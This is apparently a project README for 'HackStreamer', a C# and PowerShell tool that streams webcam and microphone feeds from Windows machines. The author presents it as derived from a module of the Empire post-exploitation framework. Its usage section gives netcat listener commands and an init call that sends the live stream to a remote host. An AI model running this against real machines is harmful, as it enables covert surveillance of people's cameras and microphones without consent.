# HackStreamer
is a webcam🎥+audio🎤 tcp/udp-based streamer from Windows machines.

## WHAT DOES IT DO?
It can stream from webcam/audio devices locally or to a remote host or save the stream to a local file.

## WHY
Because of fun. Once I hacked my own machine and wanted to get a stream from webcam.
But I couldn't. So, then I didn't find the solution and forgot about it for some time.
Recently I remembered it again and started looking for a solution.
Though this project is written in c#, and uses such terms like media filters,
I knew nothing about it at all. I had 0 knowledge in c# and so about the filters.
During the work I learned some basic stuff.

## HOW IT WAS DONE
I was looking for solutions on the internet and the most suitable what I found
was a solution from [Empire Framework](https://github.com/EmpireProject/Empire/blob/master/lib/modules/powershell/collection/WebcamRecorder.py)
But it only could write the stream to a file on a local disk.
Though I liked their idea of including a dll library into a powershell script.
I found the source of that library, it was released in 2002.
I was considering many variants like this one, avicap32.dll or Windows Media Foundation.
And stopped at DirectShow from 2002, as I supposed this should be the most 
supportable.
This project is a compilation of countless internet solutions that I found
while developing it and my own efforts. But it works :)
When the main part responsible for streaming itself was ready I faced another problem.
It could stream or be watched only from Windows based services. So I wrote custom WriterSink,
which can stream over network.
I tested my solution on Windows 7 and Windows 10.

## WHAT'S INCLUDED
Here you can find the source code of the library, it uses `.NET Framework 2.0`
And a ready-to-go-all-included-fully-independent `ps1` script. You can see the basic usage in that script.

## USAGE
The common part on the streaming server should be:
```powershell
> $streamer = new-object Hack.HackStreamer
```

### Then if you want to stream **locally**:
```powershell
> $streamer.Init(@{share=1337})
```
And on the other side:
```sh
$ nc <streaming_host> 1337 | ffplay -
```

### Or if you want to stream **to a remote server**:
Set up a listener:
```sh
$ nc -lnp 4111 | ffplay -
```
Then init:
```powershell
> $streamer.Init(@{send="10.10.13.37:4111"})
```

And the final part:
```powershell
> $streamer.Run()
```